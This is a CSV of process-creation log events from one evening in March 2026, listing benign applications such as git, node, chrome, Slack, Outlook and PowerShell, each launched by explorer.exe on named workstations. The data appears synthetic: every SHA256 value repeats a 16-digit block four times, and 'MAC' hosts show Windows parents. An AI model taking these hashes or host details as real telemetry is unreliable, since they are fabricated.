2026-03-15 18:40:27.327,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=000206091c773e7c000206091c773e7c000206091c773e7c000206091c773e7c
2026-03-15 18:46:45.767,FIN-WS31,l.chen,1,node,"node",explorer.exe,,,SHA256=002171f74f067466002171f74f067466002171f74f067466002171f74f067466
2026-03-15 19:01:07.206,FIN-WS31,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00095e04de8f3b9200095e04de8f3b9200095e04de8f3b9200095e04de8f3b92
2026-03-15 19:06:21.440,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00120636393ae45800120636393ae45800120636393ae45800120636393ae458
2026-03-15 19:20:40.958,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001a62e3b33702ef001a62e3b33702ef001a62e3b33702ef001a62e3b33702ef
2026-03-15 19:25:55.064,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=000f4b58eb73a61a000f4b58eb73a61a000f4b58eb73a61a000f4b58eb73a61a
2026-03-15 19:31:50.280,BLD-RUN-02,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00088e7655b8195d00088e7655b8195d00088e7655b8195d00088e7655b8195d
2026-03-15 19:45:24.091,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001b5348c90b4994001b5348c90b4994001b5348c90b4994001b5348c90b4994
2026-03-15 19:53:14.355,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0000dff3badf1a250000dff3badf1a250000dff3badf1a250000dff3badf1a25
2026-03-15 19:58:03.066,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c591814266365001c591814266365001c591814266365001c591814266365
2026-03-15 20:11:47.256,MAC-DEV-17,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00202e36e15fdb4800202e36e15fdb4800202e36e15fdb4800202e36e15fdb48
2026-03-15 20:15:31.578,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001515c7f88caea8001515c7f88caea8001515c7f88caea8001515c7f88caea8
2026-03-15 20:18:51.229,FIN-WS31,t.owens,1,git,"git",explorer.exe,,,SHA256=000e791a40e3257b000e791a40e3257b000e791a40e3257b000e791a40e3257b
2026-03-15 20:33:41.365,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=0008335b096b63ce0008335b096b63ce0008335b096b63ce0008335b096b63ce
2026-03-15 20:47:05.542,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004f720bc1b1faa0004f720bc1b1faa0004f720bc1b1faa0004f720bc1b1faa
2026-03-15 20:56:47.376,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=000aa8c579609041000aa8c579609041000aa8c579609041000aa8c579609041
2026-03-15 21:03:32.498,BLD-RUN-02,m.sato,1,node,"node",explorer.exe,,,SHA256=00165b6efa2baa0e00165b6efa2baa0e00165b6efa2baa0e00165b6efa2baa0e
2026-03-15 21:15:47.410,FIN-WS31,m.sato,1,node,"node",explorer.exe,,,SHA256=0012c49100cf7db50012c49100cf7db50012c49100cf7db50012c49100cf7db5
2026-03-15 21:30:25.883,MAC-DEV-17,t.owens,1,node,"node",explorer.exe,,,SHA256=001da7cd59985314001da7cd59985314001da7cd59985314001da7cd59985314
2026-03-15 21:45:14.635,BLD-RUN-02,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00174d9343fa454a00174d9343fa454a00174d9343fa454a00174d9343fa454a
2026-03-15 21:56:36.220,MAC-DEV-17,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0010726fd23a60b10010726fd23a60b10010726fd23a60b10010726fd23a60b1
2026-03-15 22:05:15.535,FIN-WS22,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0006761e7ae351f20006761e7ae351f20006761e7ae351f20006761e7ae351f2
2026-03-15 22:11:15.564,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00125c8530e62ad800125c8530e62ad800125c8530e62ad800125c8530e62ad8
2026-03-15 22:24:01.456,FIN-WS31,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0010ca3f8c5426b50010ca3f8c5426b50010ca3f8c5426b50010ca3f8c5426b5
2026-03-15 22:31:55.861,MAC-DEV-04,l.chen,1,git,"git",explorer.exe,,,SHA256=000bf9167810c81e000bf9167810c81e000bf9167810c81e000bf9167810c81e
2026-03-15 22:43:53.598,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001db65cdec008c1001db65cdec008c1001db65cdec008c1001db65cdec008c1
2026-03-15 22:56:42.923,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=000a9d571b5463e2000a9d571b5463e2000a9d571b5463e2000a9d571b5463e2
2026-03-15 23:02:27.872,FIN-WS31,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001cbd55db70827b001cbd55db70827b001cbd55db70827b001cbd55db70827b
2026-03-15 23:13:56.594,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cb4a1d0788d6a000cb4a1d0788d6a000cb4a1d0788d6a000cb4a1d0788d6a
2026-03-15 23:22:16.153,BLD-RUN-02,n.byrd,1,node,"node",explorer.exe,,,SHA256=001fcfad2f81e3dc001fcfad2f81e3dc001fcfad2f81e3dc001fcfad2f81e3dc
2026-03-15 23:26:10.352,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000cf3801ec0f9d0000cf3801ec0f9d0000cf3801ec0f9d0000cf3801ec0f9d0
2026-03-15 23:33:52.954,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017dbee3d1e3de40017dbee3d1e3de40017dbee3d1e3de40017dbee3d1e3de4
2026-03-15 23:37:44.313,FIN-WS22,r.kapoor,1,git,"git",explorer.exe,,,SHA256=0013cbc681fa9ebe0013cbc681fa9ebe0013cbc681fa9ebe0013cbc681fa9ebe
2026-03-15 23:47:20.112,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000a45741f8fa9e8000a45741f8fa9e8000a45741f8fa9e8000a45741f8fa9e8
2026-03-15 23:56:37.993,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000f9c5559874a40000f9c5559874a40000f9c5559874a40000f9c5559874a40
2026-03-15 23:59:55.505,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000c882b95c84b09000c882b95c84b09000c882b95c84b09000c882b95c84b09
